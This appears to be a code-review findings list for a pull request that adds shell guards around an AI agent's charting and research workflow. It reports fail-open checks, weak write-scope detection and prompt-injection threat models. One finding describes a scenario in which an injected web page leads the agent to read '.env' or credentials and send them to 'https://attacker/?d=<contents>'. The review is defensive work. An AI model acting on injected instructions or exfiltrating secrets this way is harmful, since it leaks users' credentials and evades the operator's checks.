findings.description: An unparsable decision ledger can authorize force-deleting an unmerged spike branch. When yq fails without producing output, jq 1.6 -e succeeds on the empty input; the pipeline therefore reports that the spike is decided.
findings.failure_mode: git branch -D spike/<slug> bypasses the unmerged-work block without a verified operator decision, potentially losing prototype commits.
findings.suggested_fix: Check yq's exit status separately, require a valid JSON document, and require jq to produce an explicit true result.

findings.description: The guard relies exclusively on dec-write-lib.sh context, which treats a PRD autonomous Status as advisory and returns interactive when that is the only unattended signal. This contradicts the command's explicit requirement to refuse that context.
findings.failure_mode: An autonomous PRD session passes the guard and can start interactive charting without the operator.
findings.suggested_fix: Explicitly reject an autonomous PRD Status in chart-guard.sh, or add a strict context mode that promotes this signal to unattended.

findings.description: The research scope check compares porcelain status entries rather than file contents. If an application file was already modified before dispatch, further writes leave the same ' M path' entry and disappear from the comparison.
findings.failure_mode: A research agent can change an already dirty application file while research-end reports success, defeating the required report-only write restriction.
findings.suggested_fix: Capture and compare content fingerprints before and after dispatch, including dirty and untracked files, and permit changes only to the assigned report path.

findings.description: The probe's main-tree integrity check records only git status text. Modifying an already dirty tracked file leaves that text unchanged; modifying files inside an already ignored directory can also leave its collapsed status entry unchanged.
findings.failure_mode: A probe that accesses the main tree through an absolute path can overwrite existing work and still receive exit 0, despite the helper promising to fail whenever the main tree changes.
findings.suggested_fix: Compare file-content fingerprints and file membership before and after the probe, covering dirty, untracked, and ignored files.

findings.description: The spike-decided predicate is `yq ... 2>/dev/null | jq -e ...`. The pipeline's status is jq's, not yq's. When yq fails (unparsable ledger, yq runtime error) jq receives empty input and, on jq 1.6, `-e` exits 0 with no output. The predicate then returns success and `_fr11_all_merged` `continue`s past the spike branch, so `git branch -D spike/<slug>` is ALLOWED. The header comment promises 'any failed lookup keeps the block'; the code fails open. The PR's own test 'D-5.9: an unparsable ledger keeps the block' fails for exactly this reason.
findings.failure_mode: A corrupt or hand-edited decisions.yaml (or any yq error) silently converts the FR-1.1 block into an allow for every spike/* branch deletion, destroying the unmerged prototype that is the decision's only pointer.
findings.suggested_fix: Capture yq output and its exit code separately: `json=$(yq -o=json -I0 '.' "$ledger" 2>/dev/null) || return 1; [[ -n "$json" ]] || return 1; printf '%s' "$json" | jq -e ... >/dev/null`. Alternatively compare jq's stdout to the literal `true` (`[[ $(... | jq ...) == true ]]`) so an empty result can never count as success regardless of jq version.

findings.description: chart-guard.sh delegates the whole unattended verdict to `dec-write-lib.sh context` and refuses only when that prints `unattended`. The guard header (line 8), commands/chart.md 'Interactive only' and test CD-10 all state that a PRD whose Status line says autonomous is refused. `dec-write-lib.sh context` prints `interactive` for a PRD-only signal (it is advisory there), so the guard exits 0 and `/chart` proceeds; `chart-ticket.sh close --reason` uses the same check and also goes through. The PR's own CD-10 test fails.
findings.failure_mode: An autonomous-mode PRD cycle can start or continue a chart (and abandon a map with --reason) without an operator, which is the exact condition the command's one hard rule says must be refused.
findings.suggested_fix: Have the guard check the PRD Status line itself when ctx is `interactive` (e.g. grep -qiE '^\*\*Status\*\*:.*autonomous' "$ROOT/grimoires/loa/prd.md" → treat as unattended), or extend `dec-write-lib.sh context` to return `unattended` for that signal and add a `--strict` mode the guard and op_close use. Apply the same fix to chart-ticket.sh op_close --reason.

findings.cross_file_justification: chart-researcher.md grants an unrestricted Write tool (and agent-types.yaml marks it write_capable: true); research-end is the only mechanical check that the subagent wrote exactly one file. The check in chart-ticket.sh is what makes the agent definition safe.
findings.description: The scope check computes `comm -13` between the pre-dispatch and post-return `git status --porcelain --untracked-files=all --ignored=matching` line sets and only flags NEW lines. Any write that does not add a status line is invisible: overwriting a tracked file that was already modified before dispatch (` M path` unchanged), overwriting an existing untracked file (`?? path` unchanged), and overwriting an existing ignored file (`!! path` unchanged), e.g. `.env`, `.claude/settings.local.json`, or `.loa.config.yaml`. The awk filter also exempts everything under grimoires/loa/research/, so the subagent may overwrite other tickets' reports and the `.chart-*.dispatch` markers (the research cap and the baseline snapshots) undetected. The agent explicitly consumes untrusted web pages, so a prompt-injected Write to an already-present file is the realistic path.
findings.failure_mode: A fetched page instructs the researcher to write `.claude/settings.local.json` (already present, ignored) or an already-dirty tracked file; research-end reports success, the ticket resolves, and the planted content persists into later sessions.
findings.suggested_fix: Snapshot content, not status lines: record `find . -type f -not -path './.git/*' -printf '%p\t%T@\t%s\n'` (or a sha256 manifest via `git hash-object --stdin-paths`) at research-begin and diff it at research-end, allowing exactly the one report path. At minimum also compare mtimes of pre-existing dirty/untracked/ignored entries, and restrict the research/ exemption to the single expected report path.

findings.description: The header claims the output is 'filtered again here ... so a br that ignores a filter cannot widen the set', but the jq filter re-checks type, status, assignee and label only. The `--parent <epic>` constraint is trusted entirely to br. A br that ignores or misparses --parent returns question beads from every map, and `op_claim` (which has no map check, unlike `bead_row`) would happily claim one.
findings.failure_mode: A /chart session on map A lists and claims tickets belonging to map B; the later resolve dies with 'not a row of map', leaving a stray in_progress claim on B's bead.
findings.suggested_fix: Add `and ((.parent // .parent_id // "") | tostring) == $epic` to the filter (pass --arg epic "$EPIC"), or have op_claim call bead_row first to verify the ticket is on this map.

findings.description: get-ready-work.sh drops questions by `.issue_type` only, while chart-frontier.sh (line 55) and chart-ticket.sh bead_row hedge with `.issue_type // .type`. If br emits `type` for any release, questions pass straight into the build path's ready set, the exact thing the header says never happens, and the two scripts disagree about what a question is.
findings.failure_mode: /implement or /run picks a decision ticket as build work and 'implements' a question.
findings.suggested_fix: Use the same accessor everywhere: `select(((.issue_type // .type // "") | ascii_downcase) != "question")`, ideally via a shared jq snippet or a helper in a beads lib.

findings.description: rule-out only rejects the ledger row when it is open or proposed. For a `decided` row (operator-confirmed) it skips the ledger, yet still closes the bead with 'out of scope' and appends an Out of scope bullet to the map doc. The ledger then says decided while the map and beads say ruled out, with no error.
findings.failure_mode: Silent ledger/doc disagreement; the hand-off snapshot presents a decision as settled that the map doc lists as out of scope.
findings.suggested_fix: Mirror op_resolve: `case "$rst" in open|proposed) reject ;; *) die "${row} is ${rst}; supersede it with a new ticket instead of ruling it out" ;; esac` before any bead or doc write.

findings.description: op_epic's idempotency key is the map doc's existence, but the epic bead is created before the doc. If mkdir/mktemp/mv fails after `br create` succeeds (or the user interrupts between them), the next run finds no doc and creates a second `map-<slug>` epic, contradicting the header's 'a re-run ... creates only what is missing'.
findings.failure_mode: Duplicate map epics on beads for the same slug; chart-frontier and close only ever see the one named in the doc.
findings.suggested_fix: Before `br create`, look up an existing epic by slug/label (`beads_all | jq 'select(.issue_type=="epic" and (.slug // "")=="map-'"$SLUG"'")'`) and reuse its id; or write the doc with a placeholder Epic first and patch it after create.

findings.description: Report and marker paths join slug and ticket with a hyphen (`chart-<slug>-<ticket>`), and both slugs may contain hyphens. Map `eval` ticket `workers-x` and map `eval-workers` ticket `x` share `chart-eval-workers-x.md` and the same `.dispatch` marker. op_research_begin's cap counts `.chart-${SLUG}-*.dispatch`, and op_handoff inlines `chart-${SLUG}-*.md`, so map `eval` counts and inlines map `eval-workers`' research.
findings.failure_mode: Research cap exhausted by another map; a hand-off snapshot inlines another map's reports; research-end validates the wrong report.
findings.suggested_fix: Use an unambiguous separator (e.g. `chart-<slug>__<ticket>.md` or a per-map directory `research/<slug>/<ticket>.md`) and update chart-researcher.md, chart.md and the globs accordingly.

findings.description: The throwaway worktree shares refs, the object store and .git/config with the main repository. The verdict compares only `git status --porcelain` of the main working tree, so a probe that runs `git branch`, `git tag`, `git update-ref`, `git push`, `git config --local`, or `git stash` inside the worktree alters the main repo invisibly. The header's guarantee ('never writes ... in the main tree') is narrower than the probe's actual reach.
findings.failure_mode: An unblock probe creates or moves branches/tags or rewrites local git config in the real repo and exits 0.
findings.suggested_fix: Snapshot `git for-each-ref` and `git config --local --list` alongside status and compare them too, or run the probe in a `git clone --shared`/`--local` copy instead of a linked worktree.

findings.description: `close --consumed-by` is the one operation allowed unattended, but it does not require Status handed-off. On a map still `charting` it rejects every open ledger row and closes every bead, i.e. an autonomous run can erase an in-progress map by naming its slug.
findings.failure_mode: An unattended /plan-and-analyze passes the wrong slug (or a model picks a charting map) and the map's open decisions are all rejected with 'map closed: consumed by ...'.
findings.suggested_fix: In the --consumed-by branch require `doc_field Status == handed-off` (and that `grimoires/loa/context/chart-<slug>.md` exists); otherwise die with 'only a handed-off map is consumed'.

findings.description: map_rows globs pending ledger files at `${SCRIPT_DIR}/../../grimoires/loa/a2a/*/decisions-pending.yaml`, ignoring `--root`. With a fixture root and no `--ledger`, the live repository's pending rows are merged into the fixture's map; with `--root` pointing at a real alternate checkout, its pending rows are missed.
findings.failure_mode: Tests pass against live data by accident, or a worktree's pending rows for the map are invisible to resolve/close.
findings.suggested_fix: Use `${G}/a2a/*/decisions-pending.yaml` (G is already derived from ROOT).

findings.description: The researcher combines unrestricted repository Read/Grep/Glob with WebFetch to arbitrary URLs and is explicitly expected to ingest untrusted pages. That is a complete exfiltration channel: an injected page can instruct it to read `.env`, `.claude/settings.local.json` or credentials under grimoires/ and fetch `https://attacker/?d=<contents>`. The only mitigation is a prompt-level rule ('treat as data').
findings.failure_mode: Repository secrets leave the machine via a WebFetch query string during a research ticket.
findings.suggested_fix: Deny Read/Grep/Glob on secret-bearing paths (.env*, *.pem, .claude/settings.local.json, .run/, .beads/) in the agent's permission config, and/or restrict WebFetch to an allowlist of documentation hosts; at minimum have the dispatch prompt pass pre-fetched sources instead of granting WebFetch.

findings.description: spike-validator.bats reads `grimoires/loa/spikes/TEMPLATE.md`, which this PR does not add and the base tree does not contain. Two tests fail on a clean checkout, and chart-ticket.sh/block-destructive-bash.sh both reference grimoires/loa/spikes/<slug>.md as the verdict source without any template or validator shipped for it.
findings.failure_mode: CI red on merge; operators have no template for the spike verdict file the FR-1.1 exception depends on.
findings.suggested_fix: Add grimoires/loa/spikes/TEMPLATE.md to the PR (or point the tests at a fixture under tests/fixtures/) and reference it from the SP-1/FR-1.1 messages.
